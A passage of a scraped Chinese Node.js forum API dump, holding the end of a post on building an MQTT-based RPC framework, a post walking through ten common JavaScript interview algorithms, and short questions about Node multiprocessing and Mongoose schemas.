   &#x2F;&#x2F; 监听连接事件\n    this.server.on(&#x27;connection&#x27;, (stream) =&gt; {\n      &#x2F;&#x2F; 实例化mqtt对象\n      const socket = mqttCon(stream);\n      debug(&#x27;=========== new connection ===========&#x27;);\n      \n      &#x2F;&#x2F; 监听mqtt服务connect事件\n      socket.on(&#x27;connect&#x27;, () =&gt; {\n        debug(&#x27;connected&#x27;);\n        socket.connack({ returnCode: 0 });\n      });\n\n      socket.on(&#x27;error&#x27;, (err) =&gt; {\n        debug(&#x27;error : %j&#x27;, err);\n        socket.destroy();\n      });\n\n      socket.on(&#x27;close&#x27;, () =&gt; {\n        debug(&#x27;===========     close     ============&#x27;);\n        socket.destroy();\n      });\n\n\n      socket.on(&#x27;disconnect&#x27;, () =&gt; {\n        debug(&#x27;===========   disconnect   ============&#x27;);\n        socket.destroy();\n      });\n        \n      &#x2F;&#x2F; 监听mqtt服务publish事件，接收client端请求\n      socket.on(&#x27;publish&#x27;, (pkg) =&gt; {\n        &#x2F;&#x2F; 消费client端的请求\n        self.consumers(pkg, socket);\n      });\n    });\n  }\n    \n  &#x2F;&#x2F; 消费client端的请求\n  consumers (pkg, socket) {\n    &#x2F;&#x2F; 赋值当前作用的指针给self对象\n    const self = this;\n    &#x2F;&#x2F; 将client的数据包转成json字符，字节序不同的处理已经在mqtt的底层转换好了\n    let content = pkg.payload.toString();\n    debug(content);\n    content = JSON.parse(content);\n    &#x2F;&#x2F; 定义响应数据包\n    const respMsg = {\n      msgId: content.msgId\n    };\n    &#x2F;&#x2F; 如果请求调用的函数不存在则加上错误消息响应回去client端\n    if (this.events[content.method] === null) {\n      &#x2F;&#x2F; 定义调用错误消息\n      respMsg.error = {\n        message: &#96;not found ${content.method} method&#96;\n      };\n      &#x2F;&#x2F; 推送到client端\n      self.response(socket, {messageId: pkg.messageId, body: respMsg});\n    } else {\n      &#x2F;&#x2F; 如果存在有效的函数则准备调用\n      const fn = this.events[content.method].method;\n      &#x2F;&#x2F; 设置调用函数的回调事件，用来处理调用函数完成后的参数返回\n      const callback = function (err, result) {\n        &#x2F;&#x2F; 获取调用完后的参数结果\n        respMsg.body = result;\n        &#x2F;&#x2F; 推送到client端\n        self.response(socket, {messageId: pkg.messageId, body: respMsg});\n      };\n      &#x2F;&#x2F; 执行调用参数\n      fn.call(fn, content.body, callback);\n    }\n  }\n    \n  &#x2F;&#x2F; 推送调用结果数据包给client端\n  response (socket, result) {\n    socket.publish({\n      topic: &#x27;rpc&#x27;,\n      qos: 1,\n      messageId: result.messageId,\n      payload: JSON.stringify(result.body)\n    });\n  }\n\n\n  &#x2F;&#x2F; 绑定kirito定义的函数集合\n  addEvent (events) {\n    const eventKeys = Object.getOwnPropertyNames(events);\n    eventKeys.some(event =&gt; {\n      this.events[event] = {\n        method: events[event].method,\n        param: events[event].param\n      };\n    });\n  }\n\n}\n\nmodule.exports.create = function () {\n  return new MQTT();\n};\n</code></pre><p>定义protocol接口，加上这一层是为了以后的多协议，mqtt只是默认使用的协议：</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; protocol.js\n\n&#x27;use strict&#x27;;\n\nconst mqtt = require(&#x27;.&#x2F;protocol&#x2F;mqtt&#x27;);\n\nmodule.exports.create = function (opts = {}) {\n  return mqtt.create(opts);\n};\n</code></pre><p>接下来是server端的暴露出去的接口：</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; index.js\n\n&#x27;use strict&#x27;;\n\nconst protocol = require(&#x27;.&#x2F;protocol.js&#x27;);\n\nclass Server {\n\n  constructor () {\n    &#x2F;&#x2F; 实例化协议对象\n    this.server = protocol.create();\n  }\n    \n  &#x2F;&#x2F; 将kirito定义的接口和函数集合绑定\n  addKiritoService (service, methods) {\n    const serviceKeys = Object.getOwnPropertyNames(service);\n    const methodKeys = Object.getOwnPropertyNames(methods);\n    const events = {};\n    serviceKeys.some(method =&gt; {\n      let idx = -1;\n      if ((idx = methodKeys.indexOf(method)) !== -1) {\n        events[method] = {\n          method: methods[method],\n          param: service[method].param\n        };\n        methodKeys.splice(idx, 1);\n      }\n    });\n    if (Object.keys(events).length &gt; 0) {\n      this.server.addEvent(events);\n    }\n  }\n\n  listen (port) {\n    this.server.listen(port);\n  }\n\n}\n\nmodule.exports = Server;\n</code></pre><blockquote>\n<p><strong>client</strong>：</p>\n</blockquote>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; protocol&#x2F;mqtt.js\n\n&#x27;use strict&#x27;;\n\nconst net = require(&#x27;net&#x27;);\nconst debug = require(&#x27;debug&#x27;)(&#x27;polix-rpc:mqtt&#x27;);\nconst EventEmitter = require(&#x27;events&#x27;).EventEmitter;\nconst mqttCon = require(&#x27;mqtt-connection&#x27;);\n\nclass MQTT extends EventEmitter {\n\n  constructor (server) {\n    super();\n    &#x2F;&#x2F; 获取server端连接信息\n    this.host = server.host || &#x27;localhost&#x27;;\n    this.port = server.port || 10003;\n    &#x2F;&#x2F; 是否服务已连接\n    this.connected = false;\n    &#x2F;&#x2F; 是否服务已关闭\n    this.closed = false;\n  }\n    \n  &#x2F;&#x2F; 连接server服务\n  connect (cb) {\n    &#x2F;&#x2F; 连接了就不用再次执行连接\n    if (this.connected) {\n      cb &amp;&amp; cb (new Error(&#x27;mqtt rpc has already connected&#x27;), null);\n      return;\n    }\n\n    &#x2F;&#x2F; 复制当前作用域上下文的指针给self变量\n    const self = this;\n    &#x2F;&#x2F; 获取net服务连接流\n    const stream = net.createConnection(this.port, this.host);\n    &#x2F;&#x2F; 初始化mqtt服务\n    this.socket = mqttCon(stream);\n    &#x2F;&#x2F; 监听conack事件\n    this.socket.on(&#x27;connack&#x27;, (pkg) =&gt; {\n      debug(&#x27;conack: %j&#x27;, pkg);\n    });\n\n    &#x2F;&#x2F; 监听error事件\n    this.socket.on(&#x27;error&#x27;, function (err) {\n      debug(&#x27;error: %j&#x27;, err);\n    });\n\n\n    &#x2F;&#x2F; 监听publish事件，接收server端调用函数结果的返回数据\n    this.socket.on(&#x27;publish&#x27;, (pkg) =&gt; {\n      &#x2F;&#x2F; 将数据包转成json字符\n      const content = pkg.payload.toString();\n      debug(content);\n      &#x2F;&#x2F; 将数据转发到MQTT的对象事件上\n      this.emit(&#x27;data&#x27;, JSON.parse(content));\n    });\n\n    &#x2F;&#x2F; 监听puback事件\n    this.socket.on(&#x27;puback&#x27;, (pkg) =&gt; {\n      debug(&#x27;puback: %j&#x27;, pkg);\n    });\n\n    &#x2F;&#x2F; 发起连接\n    this.socket.connect({\n      clientId: &#x27;MQTT_RPC_&#x27; + Math.round(new Date().getTime() &#x2F; 1000)\n    }, () =&gt; {\n      if (self.connected) {\n        return;\n      }\n        \n      &#x2F;&#x2F; 设置已连接\n      self.connected = true;\n\n      cb &amp;&amp; cb(null, {connected: self.connected});\n    });\n  }\n    \n  &#x2F;&#x2F; 发起调用函数请求\n  send (param) {\n    this.socket.publish({\n      topic: &#x27;rpc&#x27;,\n      qos: 1,\n      messageId: 1,\n      payload: JSON.stringify(param || {})\n    });\n  }\n\n  &#x2F;&#x2F; 关闭连接\n  close () {\n    if (this.closed) {\n      return;\n    }\n    this.closed = true;\n    this.connected = false;\n    this.socket.destroy();\n  }\n\n}\n\nmodule.exports.create = function (server) {\n  return new MQTT(server || {});\n};\n</code></pre><p>定义protocol接口：</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; protocol.js\n\n&#x27;use strict&#x27;;\n\nconst mqtt = require(&#x27;.&#x2F;protocol&#x2F;mqtt&#x27;);\n\nmodule.exports.create = function (opts = {}) {\n  return mqtt.create(opts);\n};\n</code></pre><p>最后是client端暴露的接口：</p>\n<pre class=\"prettyprint language-js\"><code>&#x27;use strict&#x27;;\n\nconst protocol = require(&#x27;.&#x2F;protocol.js&#x27;);\nconst connect = Symbol.for(&#x27;connect&#x27;);\nconst uuid = require(&#x27;uuid&#x2F;v1&#x27;);\n\nclass Client {\n\n  constructor(opts, service) {\n    &#x2F;&#x2F; 声明client实例\n    this.client = void(0);\n    &#x2F;&#x2F; 调用协议连接接口\n    this[connect](opts, service);\n    &#x2F;&#x2F; 定义回调参数集合\n    this.callQueues = {};\n  }\n\n  &#x2F;&#x2F; 连接server\n  [connect] (opts, service) {\n    &#x2F;&#x2F; 初始化协议服务\n    this.client = protocol.create(opts);\n    &#x2F;&#x2F; 发起连接\n    this.client.connect((err) =&gt; {\n      if (err) {\n        throw new Error(err);\n      }\n    });\n      \n    &#x2F;&#x2F; 复制当前作用域的上下文指针给self对象\n    const self = this;\n\n    &#x2F;&#x2F; 监听协议data时间，接收协议转发server端响应的数据\n    this.client.on(&#x27;data&#x27;, function (result) {\n      &#x2F;&#x2F; 听过msgId取出回调函数\n      const fn = self.callQueues[result.msgId];\n      &#x2F;&#x2F; 如果有调用错误信息，则直接回调错误\n      if (result.error) {\n        return fn.call(fn, result.error, null);\n      }\n      &#x2F;&#x2F; 执行回调\n      fn.call(fn, null, result.body);\n    });\n    &#x2F;&#x2F; 绑定kirito定义的接口参数到协议对象中\n    const serviceKeys = Object.getOwnPropertyNames(service);\n    serviceKeys.some(method =&gt; {\n      &#x2F;&#x2F; 增加client端的函数，对应server端的调用函数\n      self[method] = function () {\n        &#x2F;&#x2F; 取出发送的数据\n        const reqMsg = arguments[0];\n        &#x2F;&#x2F; 取出回调函数\n        const fn = arguments[1];\n        const paramKey = Object.getOwnPropertyNames(service[method].param);\n        paramKey.some((param) =&gt; {\n          if (reqMsg[param] === null) {\n            throw new Error(&#96;Parameters &#x27;${param}&#x27; are missing&#96;);\n          }\n          &#x2F;&#x2F; todo 类型判断及转换\n        });\n        &#x2F;&#x2F; 为每个请求标记\n        const msgId = uuid();\n        &#x2F;&#x2F; 注册该请求的回调函数到回调队列中\n        self.callQueues[msgId] = fn;\n        &#x2F;&#x2F; 发起调用函数请求\n        self.client.send({method, msgId, body: reqMsg});\n      };\n    });\n  }\n\n}\n\nmodule.exports = Client;\n</code></pre><p>就这样，一个简单的IDL+RPC框架就这样搭建完成了。这里只是描述RPC的原理和常用的调用方式，要想用在企业级的开发上，还得加上服务发现、注册，服务熔断，服务降级等，读者如果有兴趣可以在Github上fork下来或者提PR来改进这个框架，有什么问题也可以提Issue, 当然PR是最好的 : ) 。</p>\n<p>仓库地址：</p>\n<p>RPC: <a href=\"https://github.com/polixjs/polix-rpc\">https://github.com/polixjs/polix-rpc</a></p>\n<p>IDL: <a href=\"https://github.com/rickyes/kiritobuf\">https://github.com/rickyes/kiritobuf</a></p>\n</div>","title":"从零开始实现一个IDL+RPC框架","last_reply_at":"2019-04-02T10:07:51.760Z","good":true,"top":false,"reply_count":33,"visit_count":5858,"create_at":"2018-08-03T01:39:42.660Z","author":{"loginname":"zhoumingque","avatar_url":"https://avatars3.githubusercontent.com/u/20432815?v=4&s=120"}},{"id":"5ca2caf86c1de62dce466c76","author_id":"5c98426500bcfd7eb2be5add","tab":"share","content":"<div class=\"markdown-text\"><h2>Introduction</h2>\n<p>面试过程通常从最初的电话面试开始，然后是现场面试，检查编程技能和文化契合度。几乎毫无例外，最终的决定因素是还是编码能力。通常上，不仅仅要求能得到正确的答案，更重要的是要有清晰的思维过程。写代码中就像在生活中一样，正确的答案并不总是清晰的，但是好的推理通常就足够了。有效推理的能力预示着学习、适应和进化的潜力。好的工程师一直是在成长的，好的公司总是在创新的。</p>\n<p>算法挑战是有用的，因为解决它们的方法不止一种。这为决策的制定和决策的计算提供了可能性。在解决算法问题时，我们应该挑战自己从多个角度来看待问题的定义，然后权衡各种方法的优缺点。通过足够的尝试后，我们甚至可能看到一个普遍的真理:不存在“完美”的解决方案。</p>\n<p>要真正掌握算法，就必须了解它们与数据结构的关系。数据结构和算法就像阴阳、水杯和水一样密不可分。没有杯子，水就不能被容纳。没有数据结构，我们就没有对象来应用逻辑。没有水，杯子是空的，没有营养。没有算法，对象就不能被转换或“消费”。</p>\n<p>要了解和分析JavaScript中的数据结构，请看<a href=\"https://github.com/lvwxx/blog/issues/1\">JavaScript中的数据结构</a></p>\n<h2>Primer</h2>\n<p>在<strong>JavaScript</strong>中，算法只是一个函数，它将某个确定的数据结构输入转换为某个确定的数据结构输出。函数内部的逻辑决定了怎么转换。首先，输入和输出应该清楚地提前定义。这需要我们充分理解手上的问题，因为对问题的全面分析可以很自然地提出解决方案，而不需要编写任何代码。</p>\n<p>一旦完全理解了问题，就可以开始对解决方案进行思考，需要那些变量？ 有几种循环？ 有那些JavaScript内置方法可以提供帮助？需要考虑那些边缘情况？复杂或者重复的逻辑会导致代码十分的难以阅读和理解，可以考虑能否提出抽象成多个函数？一个算法通常上需要可扩展的。随着输入<strong>size</strong>的增加，函数将如何执行? 是否应该有某种缓存机制吗? 通常上，需要牺牲内存优化(空间)来换取性能提升(时间)。</p>\n<h3>为了使问题更加具体，画图表！</h3>\n<p>当解决方案的具体结构开始出现时，伪代码就可以开始了。为了给面试官留下深刻印象，请提前寻找重构和重用代码的机会。有时，行为相似的函数可以组合成一个更通用的函数，该函数接受一个额外的参数。其他时候，函数柯里的效果更好。保证函数功能的纯粹方便测试和维护也是非常重要的。换句话说，在做出解决问题的决策时需要考虑到架构和设计模式。</p>\n<h3>Big O（复杂度）</h3>\n<p>为了计算出算法运行时的复杂性，我们需要将算法的输入大小外推到无穷大，从而近似得出算法的复杂度。最优算法有一个恒定的时间复杂度和空间复杂度。这意味着它不关心输入的数量增长多少，其次是对数时间复杂度或空间复杂度，然后是线性、二次和指数。最糟糕的是阶乘时间复杂度或空间复杂度。算法复杂度可用以下符号表示:</p>\n<ol>\n<li>Constabt: O(1)</li>\n<li>Logarithmic: O(log n)</li>\n<li>Linear: O(n)</li>\n<li>Linearithmic: O(n log n)</li>\n<li>Quadratic: O(n^2)</li>\n<li>Expontential: O(2^n)</li>\n<li>Factorial: O(n!)</li>\n</ol>\n<p><img src=\"https://cdn-images-1.medium.com/max/1600/1*-j3Q4EiyBgc1tDTR5uKTnQ.png\" alt=\"''\"></p>\n<p>在设计算法的结构和逻辑时，时间复杂度和空间复杂度的优化和权衡是一个重要的步骤。</p>\n<h3>Arrays</h3>\n<p>一个最优的算法通常上会利用语言里固有的标准对象实现。可以说，在计算机科学中最重要的是数组。在JavaScript中，没有其他对象比数组拥有更多的实用方法。值得记住的数组方法有:sort、reverse、slice和splice。数组元素从第0个索引开始插入，所以最后一个元素的索引是 array.length-1。数组在push元素有很好的性能，但是在数组中间插入，删除和查找元素上性能却不是很优，JavaScript中的数组的大小是可以动态增长的。</p>\n<h4>数组的各种操作复杂度</h4>\n<ul>\n<li>Push: O(1)</li>\n<li>Insert: O(n)</li>\n<li>Delet: O(n)</li>\n<li>Searching: O(n)</li>\n<li>Optimized Searching: O(log n)</li>\n</ul>\n<p><strong>Map</strong> 和 <strong>Set</strong>是和数组相似的数据结构。set中的元素都是不重复的，在map中，每个Item由键和值组成。当然，对象也可以用来存储键值对，但是键必须是字符串。</p>\n<h3>Iterations</h3>\n<p>与数组密切相关的是使用循环遍历它们。在JavaScript中,有5种最常用的遍历方法，使用最多的是<strong>for</strong>循环，for循环可以用任何顺序遍历数组的索引。如果无法确定迭代的次数，我们可以使用<strong>while</strong>和<strong>do while</strong>循环，直到满足某个条件。对于任何<strong>Object</strong>, 我们可以使用 <strong>for in</strong> 和 <strong>for of</strong>循环遍历它的keys 和values。为了同时获取key和value我们可以使用 <strong>entries()</strong>。我们也可以在任何时候使用<strong>break</strong>语句终止循环，或者使用<strong>continue</strong>语句跳出本次循环进入下一次循环。</p>\n<p>原生数组提供了如下迭代方法：<strong>indexOf,lastIndexOf,includes,fill,join</strong>。 另外我们可以提供一个回调函数在如下方法中：<strong>findIndex,find,filter,forEach,map,some,every,reduce</strong>。</p>\n<h3>Recursions</h3>\n<p>在一篇开创性的论文中，Church-Turing论文证明了任何迭代函数都可以用递归函数来复制，反之亦然。有时候，递归方法更简洁、更清晰、更优雅。以这个迭代阶乘函数为例:</p>\n<pre class=\"prettyprint language-js\"><code>const factorial = number =&gt; {\n  let product = 1\n  for (let i = 2; i &lt;= number; i++) {\n    product *= i\n  }\n  return product\n}\n</code></pre><p>如果使用递归，仅仅需要一行代码</p>\n<pre class=\"prettyprint language-js\"><code>const _factorial = number =&gt; {\n  return number &lt; 2 ? 1 : number * _factorial(number - 1)\n}\n</code></pre><p>所有的递归函数都有相同的模式。它们由创建一个调用自身的递归部分和一个不调用自身的基本部分组成。任何时候一个函数调用它自身都会创建一个新的执行上下文并推入执行栈顶直。这种情况会一直持续到直到满足了基本情况为止。然后执行栈会一个接一个的将栈顶元素推出。因此，对递归的滥用可能导致堆栈溢出的错误。</p>\n<h3>最后，我们一起来思考一些常见算法题！</h3>\n<h4>1. 字符串反转</h4>\n<p>一个函数接受一个字符串作为参数，返回反转后的字符串</p>\n<pre class=\"prettyprint language-js\"><code>describe(&quot;String Reversal&quot;, () =&gt; {\n it(&quot;Should reverse string&quot;, () =&gt; {\n  assert.equal(reverse(&quot;Hello World!&quot;), &quot;!dlroW olleH&quot;);\n })\n})\n</code></pre><h5>思考</h5>\n<p>这道题的关键点是我们可以使用数组自带的<strong>reverse</strong>方法。首先我们使用 <strong>split</strong>方法将字符串转为数组，然后使用reverse反转字符串，最后使用<strong>join</strong>方法转为字符串。另外也可以使用数组的<strong>reduce</strong>方法</p>\n<p>给定一个字符串，每个字符需要访问一次。虽然这种情况发生了很多次，但是时间复杂度会正常化为线性。由于没有单独的内部数据结构，空间复杂度是恒定的。</p>\n<pre class=\"prettyprint language-js\"><code>const reverse = string =&gt; string.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;)\n\nconst _reverse = string =&gt; string.split(&#x27;&#x27;).reduce((res,char) =&gt; char + res)\n</code></pre><h4>2. 回文</h4>\n<p>回文是一个单词或短语，它的读法是前后一致的。写一个函数来检查。</p>\n<pre class=\"prettyprint language-js\"><code>describe(&quot;Palindrome&quot;, () =&gt; {\n it(&quot;Should return true&quot;, () =&gt; {\n  assert.equal(isPalindrome(&quot;Cigar? Toss it in a can. It is so tragic&quot;), true);\n })\n it(&quot;Should return false&quot;, () =&gt; {\n  assert.equal(isPalindrome(&quot;sit ad est love&quot;), false);\n })\n})\n</code></pre><h5>思考</h5>\n<p>函数只需要简单地判断输入的单词或短语反转之后是否和原输入相同，完全可以参考第一题的解决方案。我们可以使用数组的 <strong>every</strong> 方法检查第i个字符和第array.length-i个字符是否匹配。但是这个方法会使每个字符检查2次，这是没必要的。那么，我们可以使用reduce方法。和第1题一样，时间复杂度和空间复杂度是相同的。</p>\n<pre class=\"prettyprint language-js\"><code>const isPalindrome = string =&gt; {\n  const validCharacters = &quot;abcdefghijklmnopqrstuvwxyz&quot;.split(&quot;&quot;)\n  const stringCharacters = string &#x2F;&#x2F; 过滤掉特殊符号\n      .toLowerCase()\n      .split(&quot;&quot;)\n      .reduce(\n        (characters, character) =&gt;\n          validCharacters.indexOf(character) &gt; -1\n            ? characters.concat(character)\n            : characters,\n        []\n      );\n  return stringCharacters.join(&quot;&quot;) === stringCharacters.reverse().join(&quot;&quot;)\n</code></pre><h4>3. 整数反转</h4>\n<p>给定一个整数，反转数字的顺序。</p>\n<pre class=\"prettyprint language-js\"><code>describe(&quot;Integer Reversal&quot;, () =&gt; {\n it(&quot;Should reverse integer&quot;, () =&gt; {\n  assert.equal(reverse(1234), 4321);\n  assert.equal(reverse(-1200), -21);\n })\n})\n</code></pre><h5>思考</h5>\n<p>把number类型使用<strong>toString</strong>方法换成字符串，然后就可以按照字符串反转的步骤来做。反转完成之后，使用<strong>parseInt</strong>方法转回number类型，然后使用<strong>Math.sign</strong>加入符号，只需一行代码便可完成。</p>\n<p>由于我们重用了字符串反转的逻辑，因此该算法在空间和时间上也具有相同的复杂度。</p>\n<pre class=\"prettyprint language-js\"><code>const revserInteger = integer =&gt; parseInt(number\n      .toString()\n      .split(&#x27;&#x27;)\n      .reverse()\n      .join(&#x27;&#x27;)) * Math.sign(integer)\n</code></pre><h4>4. 出现次数最多的字符</h4>\n<p>给定一个字符串，返回出现次数最多的字符</p>\n<pre class=\"prettyprint language-js\"><code>describe(&quot;Max Character&quot;, () =&gt; {\n it(&quot;Should return max character&quot;, () =&gt; {\n  assert.equal(max(&quot;Hello World!&quot;), &quot;l&quot;);\n })\n})\n</code></pre><h5>思考</h5>\n<p>可以创建一个对象，然后遍历字符串，字符串的每个字符作为对象的key，value是对应该字符出现的次数。然后我们可以遍历这个对象，找出value最大的key。</p>\n<p>虽然我们使用两个单独的循环来迭代两个不同的输入(字符串和字符映射)，但是时间复杂度仍然是线性的。它可能来自字符串，但最终，字符映射的大小将达到一个极限，因为在任何语言中只有有限数量的字符。空间复杂度是恒定的。</p>\n<pre class=\"prettyprint language-js\"><code>const maxCharacter = (str) =&gt; {\n    const obj = {}\n    let max = 0\n    let character = &#x27;&#x27;\n    for (let index in str) {\n      obj[str[index]] = obj[str[index]] + 1 || 1\n    }\n    for (let i in obj) {\n      if (obj[i] &gt; max) {\n        max = obj[i]\n        character = i\n      }\n    }\n    return character\n  }\n</code></pre><h4>5.找出string中元音字母出现的个数</h4>\n<p>给定一个单词或者短语，统计出元音字母出现的次数</p>\n<pre class=\"prettyprint language-js\"><code>describe(&quot;Vowels&quot;, () =&gt; {\n it(&quot;Should count vowels&quot;, () =&gt; {\n  assert.equal(vowels(&quot;hello world&quot;), 3);\n })\n})\n</code></pre><h5>思考</h5>\n<p>最简单的解决办法是利用正则表达式提取所有的元音，然后统计。如果不允许使用正则表达式，我们可以简单的迭代每个字符并检查是否属于元音字母，首先应该把输入的参数转为小写。</p>\n<p>这两种方法都具有线性的时间复杂度和恒定的空间复杂度，因为每个字符都需要检查，临时基元可以忽略不计。</p>\n<pre class=\"prettyprint language-js\"><code>  const vowels = str =&gt; {\n    const choices = [&#x27;a&#x27;, &#x27;e&#x27;, &#x27;i&#x27;, &#x27;o&#x27;, &#x27;u&#x27;]\n    let count = 0\n    for (let character in str) {\n      if (choices.includes(str[character])) {\n        count ++\n      }\n    }\n    return count\n  }\n\n  const vowelsRegs = str =&gt; {\n    const match = str.match(&#x2F;[aeiou]&#x2F;gi)\n    return match ? match.length : 0\n  }\n</code></pre><h4>6.数组分隔</h4>\n<p>给定数组和大小，将数组项拆分为具有给定大小的数组列表。</p>\n<pre class=\"prettyprint language-js\"><code>describe(&quot;Array Chunking&quot;, () =&gt; {\n it(&quot;Should implement array chunking&quot;, () =&gt; {\n  assert.deepEqual(chunk([1, 2, 3, 4], 2), [[1, 2], [3, 4]]);\n  assert.deepEqual(chunk([1, 2, 3, 4], 3), [[1, 2, 3], [4]]);\n  assert.deepEqual(chunk([1, 2, 3, 4], 5), [[1, 2, 3, 4]]);\n })\n})\n</code></pre><p>一个好的解决方案是使用内置的slice方法。这样就能生成更干净的代码。可通过while循环或for循环来实现，它们按给定大小的步骤递增。</p>\n<p>这些算法都具有线性时间复杂度，因为每个数组项都需要访问一次。它们还具有线性空间复杂度，因为保留了一个内部的“块”数组，它与输入数组成比例地增长。</p>\n<pre class=\"prettyprint language-js\"><code>const chunk = (array, size) =&gt; {\n  const chunks = []\n  let index = 0\n   while(index &lt; array.length) {\n     chunks.push(array.slice(index, index + size))\n     index += size\n   }\n   return chunks\n}\n</code></pre><h4>7.words反转</h4>\n<p>给定一个短语，按照顺序反转每一个单词</p>\n<pre class=\"prettyprint language-js\"><code>describe(&quot;Reverse Words&quot;, () =&gt; {\n it(&quot;Should reverse words&quot;, () =&gt; {\n  assert.equal(reverseWords(&quot;I love JavaScript!&quot;), &quot;I evol !tpircSavaJ&quot;);\n })\n})\n</code></pre><h5>思考</h5>\n<p>可以使用split方法创建单个单词数组。然后对于每一个单词，可以复用之前反转string的逻辑。</p>\n<p>因为每一个字符都需要被访问，而且所需的临时变量与输入的短语成比例增长，所以时间复杂度和空间复杂度是线性的。</p>\n<pre class=\"prettyprint language-js\"><code>const reverseWords = string =&gt; string\n                                  .split(&#x27; &#x27;)\n                                  .map(word =&gt; word\n                                                .split(&#x27;&#x27;)\n                                                .reverse()\n                                                .join(&#x27;&#x27;)\n                                      ).join(&#x27; &#x27;)\n\n</code></pre><h4>8.首字母大写</h4>\n<p>给定一个短语，每个首字母变为大写。</p>\n<pre class=\"prettyprint language-js\"><code>describe(&quot;Capitalization&quot;, () =&gt; {\n it(&quot;Should capitalize phrase&quot;, () =&gt; {\n  assert.equal(capitalize(&quot;hello world&quot;), &quot;Hello World&quot;);\n })\n})\n</code></pre><h5>思考</h5>\n<p>一种简洁的方法是将输入字符串拆分为单词数组。然后，我们可以循环遍历这个数组并将第一个字符大写，然后再将这些单词重新连接在一起。出于不变的相同原因，我们需要在内存中保存一个包含适当大写字母的临时数组。</p>\n<p>因为每一个字符都需要被访问，而且所需的临时变量与输入的短语成比例增长，所以时间复杂度和空间复杂度是线性的。</p>\n<pre class=\"prettyprint language-js\"><code>const capitalize = str =&gt; {\n  return str.split(&#x27; &#x27;).map(word =&gt; word[0].toUpperCase() + word.slice(1)).join(&#x27; &#x27;)\n}\n</code></pre><h4>9.凯撒密码</h4>\n<p>给定一个短语，通过在字母表中上下移动一个给定的整数来替换每个字符。如果有必要，这种转换应该回到字母表的开头或结尾。</p>\n<pre class=\"prettyprint language-js\"><code>describe(&quot;Caesar Cipher&quot;, () =&gt; {\n it(&quot;Should shift to the right&quot;, () =&gt; {\n  assert.equal(caesarCipher(&quot;I love JavaScript!&quot;, 100), &quot;E hkra FwrwOynelp!&quot;)\n })\nit(&quot;Should shift to the left&quot;, () =&gt; {\n  assert.equal(caesarCipher(&quot;I love JavaScript!&quot;, -100), &quot;M pszi NezeWgvmtx!&quot;);\n })\n})\n</code></pre><h5>思考</h5>\n<p>首先我们需要一个包含所有字母的数组，这意味着我们需要把给定的字符串转为小写，然后遍历整个字符串，给每个字符增加或减少给定的整数位置，最后判断大小写即可。</p>\n<p>由于需要访问输入字符串中的每个字符，并且需要从中创建一个新的字符串，因此该算法具有线性的时间和空间复杂度。</p>\n<pre class=\"prettyprint language-js\"><code>const caesarCipher = (str, number) =&gt; {\n  const alphabet = &quot;abcdefghijklmnopqrstuvwxyz&quot;.split(&quot;&quot;)\n    const string = str.toLowerCase()\n    const remainder = number % 26\n    let outPut = &#x27;&#x27;\n    for (let i = 0; i &lt; string.length; i++) {\n      const letter = string[i]\n      if (!alphabet.includes(letter)) {\n        outPut += letter\n      } else {\n        let index = alphabet.indexOf(letter) + remainder\n        if (index &gt; 25) {\n          index -= 26\n        }\n        if (index &lt; 0) {\n          index += 26\n        }\n        outPut += str[i] === str[i].toUpperCase() ? alphabet[index].toUpperCase() : alphabet[index]\n      }\n    }\n  return outPut\n}\n</code></pre><h4>10.找出从0开始到给定整数的所有质数</h4>\n<pre class=\"prettyprint language-js\"><code>describe(&quot;Sieve of Eratosthenes&quot;, () =&gt; {\n it(&quot;Should return all prime numbers&quot;, () =&gt; {\n  assert.deepEqual(primes(10), [2, 3, 5, 7])\n })\n})\n</code></pre><h5>思考</h5>\n<p>最简单的方法是我们循环从0开始到给定整数的每个整数，并创建一个方法检查它是否是质数。</p>\n<pre class=\"prettyprint language-js\"><code>const isPrime = n =&gt; {\n  if (n &gt; 1 &amp;&amp; n &lt;= 3) {\n      return true\n    } else {\n      for(let i = 2;i &lt;= Math.sqrt(n);i++){\n        if (n % i == 0) {\n          return false\n        }\n      }\n      return true\n  }\n}\n\nconst prime = number =&gt; {\n  const primes = []\n  for (let i = 2; i &lt; number; i++) {\n    if (isPrime(i)) {\n      primes.push(i)\n    }\n  }\n  return primes\n}\n</code></pre><h4>自己实现一个高效的斐波那契队列，欢迎在评论区提交代码</h4>\n<pre class=\"prettyprint language-js\"><code>describe(&quot;Fibonacci&quot;, () =&gt; {\n it(&quot;Should implement fibonacci&quot;, () =&gt; {\n  assert.equal(fibonacci(1), 1);\n  assert.equal(fibonacci(2), 1);\n  assert.equal(fibonacci(3), 2);\n  assert.equal(fibonacci(6), 8);\n  assert.equal(fibonacci(10), 55);\n })\n})\n</code></pre></div>","title":"JavaScript中的算法（附10道面试常见算法题解决方法和思路）","last_reply_at":"2019-04-02T10:00:32.523Z","good":false,"top":false,"reply_count":8,"visit_count":733,"create_at":"2019-04-02T02:37:44.112Z","author":{"loginname":"lvwxx","avatar_url":"https://avatars2.githubusercontent.com/u/15207681?v=4&s=120"}},{"id":"5ca171d499e62a362ff41bd3","author_id":"5c862e877ce0df3732426edf","tab":"ask","content":"<div class=\"markdown-text\"><p>除了PM2之外,还有什么方法或者模块让node实现多进程。。。</p>\n</div>","title":"node多进程实现","last_reply_at":"2019-04-02T06:01:25.674Z","good":false,"top":false,"reply_count":10,"visit_count":645,"create_at":"2019-04-01T02:05:08.248Z","author":{"loginname":"cheerApril","avatar_url":"https://avatars0.githubusercontent.com/u/38412944?v=4&s=120"}},{"id":"5ca227df31010b2dfbb42023","author_id":"5933cd9e7e057cea7ceb98ab","tab":"ask","content":"<div class=\"markdown-text\"><p>下面是简单的示例：</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; article\nconst ArticleSchema = new Schema({\n\ttitle: {\n        type: String,\n        required: true,\n    },\n    content: {\n        type: String,\n        required: true,\n    },\n    tags: [{\n        type: Schema.Types.ObjectId,\n        ref: &#x27;Tag&#x27;,\n    }],\n})\n\n</code></pre><pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; tag\nconst TagSchema = new Schema({\n    name: {\n        type: String,\n        default: &#x27;&#x27;,\n        required: true,\n    },\n    sort: {\n        type: Number,\n        default: 0,\n    },\n    articles: [{\n        type: Schema.Types.ObjectId,\n        ref: &#x27;Article&#x27;,\n    